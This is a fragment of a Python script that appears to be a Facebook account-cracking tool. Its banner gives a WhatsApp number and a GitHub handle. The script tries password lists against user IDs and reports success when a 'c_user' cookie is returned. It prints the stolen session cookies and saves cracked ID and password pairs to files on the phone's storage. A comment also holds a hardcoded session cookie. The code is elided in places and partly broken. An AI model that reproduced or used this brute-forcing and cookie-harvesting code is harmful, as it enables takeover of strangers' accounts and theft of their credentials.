...
\33[1;92m║[•] Whatsapp  : +8801746511083            
\33[1;92m║[•] Github    : GITHUB-J1SH4N         
\33[1;92m║[•] Status    : FREE                  
\33[1;92m║[•] Network   : 3G, 4G/5G, ON           
\33[1;92m║[•] Version   : 0.1                 
\33[1;92m║[•] Tools     : ROCKSTAR CYBER ZONE           
\33[1;91m╚════════════════════════════════════════╝"""
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
         ...
         # 'cookie': 'datr=W1F3ZNUqwHFao3_VVLN75Myc; sb=W1F3ZHwTZi7gcXL5pReoSTtq; m_pixel_ratio=1.75; wd=980x1708; fr=0tzcdTWFpznyKl4sL..Bkd1Hh.fe.AAA.0.0.Bkd1Hm.AWW5niCRNKU',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ZIM-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ZIM-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
                ...
                open('/sdcard/ZIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
